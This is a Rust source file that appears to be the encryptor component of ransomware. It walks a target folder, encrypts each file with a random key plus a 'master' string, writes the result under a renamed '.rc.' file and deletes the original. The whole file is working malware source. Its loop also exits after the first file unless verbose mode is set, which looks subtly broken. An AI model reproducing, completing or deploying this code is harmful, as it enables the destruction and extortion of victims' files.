use std::env;
use std::path::PathBuf;
use std::io::{Read, Write};
use std::fs::File;

use lib::crypto::encrypt;
use lib::file::delete_file;

const SUFFIX: &str = ".rc.";
const CHUNK: usize = 1 * 1024 * 1024;

fn main() {
    let args = env::args()
        .skip(1)
        .collect::<Vec<String>>()
        .join(" ");

    let verbose = lib::misc::get_flag(&args, "verbose");

    let master = lib::misc::get_val(&args, "master");

    let folder = lib::misc::get_val(&args, "folder");
    let files = lib::file::get_files(folder);

    for file in &files {
        match process_file(file, &master) {
            Ok(_) => {
                if !verbose {
                    return;
                }

                println!("[-] encrypted for: {}", file.display());
            },
            Err(err) => {
                if !verbose {
                    return;
                }

                println!("[!] failed for: {} - {}", file.display(), err);
            },
        };
    }
}

pub fn process_file(file: &PathBuf, master: &str) -> Result<(), &'static str> {
    let key = lib::misc::gen_str(100);
    let suffix = lib::misc::gen_str(10);

    let full_key = format!("{}{}{}", key, suffix, master);

    let mut dec_file = File::open(file)
        .map_err(|_| "failed to open file")?;

    let new_file = {
        let name = file
            .file_name()
            .ok_or("failed to get file name")?
            .to_string_lossy();

        let new_name = format!("{}{}{}", name, SUFFIX, suffix);

        let mut path = PathBuf::from(file);
        path.set_file_name(new_name);
        path
    };

    let mut enc_file = File::create(&new_file)
        .map_err(|_| "failed to create encrypted file")?;

    enc_file
        .write_all(key.as_bytes())
        .map_err(|_| "failed to write to encrypted file")?;

    let mut buffer = vec![0u8; CHUNK];

    loop {
        let bytes = dec_file
            .read(&mut buffer)
            .map_err(|_| "failed to read from file")?;

        if bytes == 0 {
            break;
        }

        let chunk = &buffer[..bytes];
        let encrypted = encrypt(&chunk.to_vec(), &full_key);

        enc_file
            .write_all(encrypted.as_bytes())
            .map_err(|_| "failed to write to encrypted file")?;
    }

    drop(dec_file);
    drop(enc_file);

    delete_file(file)
        .map_err(|_| "failed to delete file")?;

    Ok(())
}